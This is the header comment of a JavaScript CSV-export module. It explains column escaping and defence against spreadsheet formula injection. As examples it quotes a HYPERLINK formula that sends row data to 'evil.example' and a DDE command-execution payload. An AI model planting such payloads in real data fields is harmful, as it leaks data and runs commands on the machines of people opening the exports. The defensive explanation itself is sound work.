/**
 * csv.js — one correct CSV writer for every export in the app.
 *
 * The exports were each hand-rolled and each wrong in a different way. Some
 * did `row.join(',')` with no escaping at all, so a comma in an address
 * silently shifted every later column; some quoted correctly but none guarded
 * against formula injection.
 *
 * Formula injection: a spreadsheet treats a cell beginning with = + @ - (or a
 * tab/carriage return) as a formula, not text. A customer name stored as
 *   =HYPERLINK("https://evil.example/?"&A1,"Click me")
 * becomes a live link leaking the row's contents when staff open the export;
 * =cmd|'/c calc'!A0 is the DDE variant. The value is attacker-controlled and
 * the code executes in the reader's spreadsheet, not in the app, so no amount
 * of care in the web UI prevents it.
 *
 * Neutralising is done by prefixing a single quote, which spreadsheets read as
 * "the rest is text". Numbers are deliberately exempt: "-100" is a legitimate
 * discount and must stay a number, so a leading "-" is only treated as
 * dangerous when the value is not numeric.
